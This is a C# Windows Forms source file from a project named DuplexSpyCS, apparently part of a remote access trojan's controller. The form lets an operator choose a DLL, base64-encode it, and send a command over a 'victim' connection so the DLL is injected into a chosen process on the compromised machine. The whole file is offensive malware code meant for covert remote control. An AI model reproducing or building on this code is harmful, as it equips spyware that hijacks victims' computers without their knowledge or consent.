using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmTaskDLLInjector : Form
    {
        public clsVictim v;
        private int m_nProcId;

        public frmTaskDLLInjector(clsVictim v, int nProcId)
        {
            InitializeComponent();

            this.v = v;
            m_nProcId = nProcId;
        }

        private void fnSetup()
        {
            textBox2.Text = m_nProcId.ToString();
        }

        private void frmTaskDLLInjector_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "DLL File (*.dll)|*.dll";
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                string szFileName = textBox1.Text;
                int nProcId = int.Parse(textBox2.Text);

                byte[] abBuffer = File.ReadAllBytes(szFileName);
                Task.Run(() => v.SendCommand($"dll|{0}|{Convert.ToBase64String(abBuffer)}|{nProcId}"));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
